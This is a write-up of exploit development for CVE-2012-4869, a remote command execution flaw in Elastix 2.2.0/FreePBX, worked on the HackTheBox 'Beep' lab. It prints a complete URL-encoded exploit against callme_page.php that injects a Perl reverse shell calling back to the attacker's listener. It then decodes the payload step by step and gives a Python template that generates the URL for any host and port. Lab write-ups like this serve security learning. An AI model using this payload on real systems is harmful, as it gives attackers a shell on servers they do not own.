# ExploitDev Journey #3 | CVE-2012-4869 | Elastix 2.2.0 - Remote Command Execution

Original Exploit: https://www.exploit-db.com/exploits/18650 <br>


**Exploit name**: FreePBX 2.10.0 / Elastix 2.2.0 - Remote Command Execution <br>
**CVE**: 2012-4869 <br>
**Lab**: Beep - HackTheBox


### Description
There is a vulnerability in Elastix that allows us to execute system commands through `callme_page.php` function.
Elastix is an unified communications server software that brings together IP PBX, email, IM, faxing and collaboration functionality. It has a Web interface and includes capabilities such as a call center software with predictive dialing.

Here we are going to use that vulnerability to execute system commands and get a shell.

<br>

### How it works
The exploit is pretty much simple, unlike other exploits all you have to do is craft a URL that includes your listener IP and port and then send the `GET` request. The URL looks like this:
```
https://10.129.112.39/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.2%3a1337%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
```
Let's break it down piece by piece to understand it. As you can see there are a lot of URL encoded characters, after decoding here is the result:
```
https://10.129.112.39/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n
Application: system
Data: perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.2:1337");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'



```

Did you notice that there are line breaks but those line breaks are encoded to form the URL properly?
Also note that I didn't make any mistake in decoding the URL, it actually has 2 line breaks at the end, line breaks are encoded to `%0D%0A` and they act just like `\n` in Python but when it comes to HTTP data, you can't just use `\n` for creating a newline, you have to use `\r\n`.

To understand this type of encoding better, let's take a look at the request headers of a BurpSuite session:
‍‍<img src="https://i.ibb.co/9V84hyn/beep1.png">

After ticking the `\n` button on the top, the newline characters were added, that's why when making that GET request and sending it to the browser we need to use the type of URL encoding that's acceptable for the system.

> `callme_page.php`


This is where the vulnerability actually exists, from here we provide queries to the application to perform certain tasks. First is that we specify an action and I think `c` here stands for `call` (guessing) then we specify a number with `callmenum`, some exploits have provided random numbers, some provided 1000 but somehow providing 233 works. It is as if there is something in the functionality of the application that makes it work when a specific number is provided:
```
callme_page.php?action=c&callmenum=233@from-internal/n
```

Then comes `@from-internal` and here we want to use `system` so that we can execute system commands:
```
Application: system
```
Then we pass data to it:
```
Data: perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.2:1337");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

The data keyword above has a value which is Perl code, the application that we specified above executes our data as a system command. Once the following command is executed:
```
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.2:1337");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

We get our reverse shell, here is my listener's IP and port: `INET(PeerAddr,"10.10.14.2:1337")`

There is not much to it, that's everything you need to know. However developing an exploit that *works* is the confusing part and I will explain why.

<br>

### Writing the exploit
Writing the exploit is said to be tricky and confusing at the same time. First of all I couldn't find a library for python3 that allowed me to send the GET request to the website. The machine that I am targetting is Beep and it has an outdated SSL certificate.
Many libraries such as requests and pycurl did not allow me to send that GET request to the server, it was better to just craft a URL that you could copy and paste to your browser and get a reverse shell.

You might be able to use `os.system` along with some built-in system commands to send the request and get a reverse shell but that's not advised to do so and the reason is that I want to write portable code or code that works across different platforms so the best way is to just generate the URL.

You can use string formatting to do that:
```py
url = f'{rhost}/recordings/misc/callme_page.php?action=c&callmenum={callmenum}@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22{lhost}%3a{lport}%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'
```

That's it, the rest of the exploit should be self-explanatory.

<br>

### Final thoughts
You might have thought "If I had to automate this, what library could I have used?". I don't have an answer to that question at the moment, I don't know which library I should use to make it possible but for now you are left with a crafted URL that you have to copy and paste.
Not all websites have outdated certificates but this one had and I had to develop the type of exploit that works on this machine.
